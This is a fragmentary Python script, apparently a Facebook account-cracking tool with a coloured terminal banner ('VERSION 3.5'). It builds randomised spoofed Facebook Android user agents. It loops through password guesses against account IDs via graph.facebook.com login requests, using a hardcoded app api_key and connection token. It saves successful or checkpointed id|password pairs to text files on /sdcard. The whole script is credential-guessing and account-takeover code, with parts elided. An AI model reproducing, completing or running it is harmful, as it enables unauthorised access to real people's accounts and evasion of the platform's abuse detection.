...
import random
def salam():
	facebook_version = f"{random.randint(100, 499)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(0000000000, 999999999))
	density = random.choice(['2.3'])
	width = random.choice(["720"])
	height = random.choice(["1612"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Samsung;FBSV/Android 14;FBOP/1;FBCA/arm64-v8a:]"
	return ua
print(salam())
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
...
def davik_user_agent():
    ...
    fb_versions = [
        ("432.0.0.20.115", "56321498"),
        ("433.0.0.24.116", "57284923"),
        ("434.0.0.27.117", "59023415"),
        ("435.0.0.29.120", "60021432"),
        ("436.0.0.30.119", "60983245"),
        ("437.0.0.35.118", "61234912"),
    ]
    densities = ["2.0", "2.5", "3.0"]
    resolutions = [("720","1600"), ("1080","2340"), ("1080","2400")]

    # pick random values
    android = random.choice(android_versions)
    mf, model = random.choice(devices)
    fbav, fbbv = random.choice(fb_versions)
    density = random.choice(densities)
    width, height = random.choice(resolutions)
    fblc = random.choice(["en_US", "en_GB"])
    fbcr = random.choice(["Robi", "Grameenphone", "Airtel", "Banglalink"])

    ua = f"Davik/2.1.0 (Linux; U; Android {android}; {model} Build/QP1A.190711.020) " \
         f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};" \
         f"FBLC/{fblc};FBCR/{fbcr};FBMF/{mf};FBBD/{mf};FBDV/{model};FBSV/{android};FBOP/1;FBCA/armeabi-v7a]"
...
def random_davik_ua():
    ...
    devices = [
        ("Xiaomi", "Redmi Note 10 Pro", "QKQ1.200830.002"),
        ("Samsung", "Galaxy A51", "RP1A.200720.012"),
        ("Realme", "Realme 8i", "SP1A.210812.016"),
        ("Oppo", "A74", "QP1A.190711.020"),
        ("Vivo", "Y20", "RP1A.200720.012")
    ]
    fb_versions = [
        ("421.0.0.19.112", "15063417"),
        ("422.0.0.25.122", "19073411"),
        ("423.0.0.30.129", "21098411"),
        ("424.0.0.15.135", "25011123")
    ]
    carriers = ["Grameenphone", "Robi", "Banglalink", "Airtel"]

    android = random.choice(android_versions)
    brand, model, build = random.choice(devices)
    fbav, fbbv = random.choice(fb_versions)
    carrier = random.choice(carriers)

    ua = (
        f"Davik/2.1.0 (Linux; U; Android {android}; {model} Build/{build}) "
        f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM/{{density=2.0,width=1080,height=2400}};"
        f"FBLC/en_US;FBCR/{carrier};FBMF/{brand};FBBD/{brand};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]"
    )
    return ua
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 3.5
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
    ...
    def methodA(self, sid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                uaa = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+'[FBAN/FB4A;FBAV/445.0.0.14.24;FBBV/50373403;FBDM/{density=3.0,width=1080,height= 2400};FBLC/en_US;FBCR/Grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Galaxy J1 (2016);FBSV/9.4.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':davik_user_agent(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_davik_ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
